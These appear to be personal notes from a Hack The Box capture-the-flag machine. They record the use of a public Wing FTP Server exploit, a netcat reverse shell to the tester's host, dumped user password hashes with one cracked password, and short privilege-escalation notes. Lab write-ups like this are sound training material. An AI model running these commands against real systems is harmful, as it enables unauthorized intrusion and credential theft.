ip 10.129.4.146

as usual nmap

![[Pasted image 20260310122027.png]]

it leads me to wingdata.htb and then ftp.wingdata.htb

Wing FTP Server v7.4.3 has a beautifull [CVE](https://github.com/4m3rr0r/CVE-2025-47812-poc)

simple reverse shell : `python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc -e /bin/sh 10.10.14.128 4444"`

stabilization : `python3 -c 'import pty; pty.spawn("/bin/bash")'` + CTRL Z + `stty raw -echo; fg`

found a user wacky, login with no password didnt work

in wingftp files i find a bunch of users and hash 

```
wacky:32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
steve:5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca
maria:a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03
john:c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10
anonymous:d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca

admin:a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba

```

thx to hashcat i get
`!#7Blushing^*Bride5`
as wacky's pass

as wacky i run linpeas and find a compromised sudo version

![[Pasted image 20260313180429.png]]

sudo -l

CVE-tar

root avc backup tool